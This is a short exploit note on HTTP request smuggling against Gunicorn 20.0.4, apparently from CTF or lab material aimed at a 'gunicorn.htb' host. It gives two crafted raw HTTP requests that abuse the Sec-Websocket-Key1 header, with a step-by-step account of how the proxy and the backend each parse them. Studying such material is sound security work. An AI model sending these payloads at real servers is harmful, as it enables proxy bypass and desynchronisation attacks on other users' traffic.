Here will be treated some CVE regarding products/solutions that have known CVE about **CLRF** exploits.

# Gunicorn 20.0.4
Reference: https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/
In this particular version of Gunicorn web-server if the **Sec-Websocket-Key1** header is shipped with the request the back-end will set the body to **8bytes size**, no matter what Content-Lenght/Transfer-Encoding size is telling from the headers, this can be used together with a dummy string of 8 **chars=8bytes** to create a missmatch aka Disconnection.

## Exploit
Create 2 different request in burp and group them in the same tab group and use single TCP connection:
```

//Request 1:
GET / HTTP/1.1
Host: gunicorn.htb
Content-Length: 49
Sec-Websocket-Key1: x

xxxxxxxxGET /404 HTTP/1.1
Host: gunicorn.htb


//Request 2:
GET / HTTP/1.1
Host: gunicorn.htb
```

## Explanation:
Frontend(proxy)= he parses everything correctly as the CL=49 will parse the first request as follows
```
GET / HTTP/1.1
Host: gunicorn.htb
Content-Length: 49
Sec-Websocket-Key1: x

xxxxxxxxGET /404 HTTP/1.1
Host: gunicorn.htb
```
And the following get to root page:
```
GET / HTTP/1.1
Host: gunicorn.htb
```
Backend(Gunicorn)= as soon the backend reads the **Sec-Websocket-Key1** and will stop to the body lenght of **8bytes ignoring** the CL/TE which means the first request will stop at **xxxxxxxx**
```
GET / HTTP/1.1
Host: gunicorn.htb
Content-Length: 49
Sec-Websocket-Key1: x

xxxxxxxx
```
Next will come the get to the **/404** that will fail
```
GET /404 HTTP/1.1
Host: gunicorn.htb
```
And lastly
```
GET / HTTP/1.1
Host: gunicorn.htb
```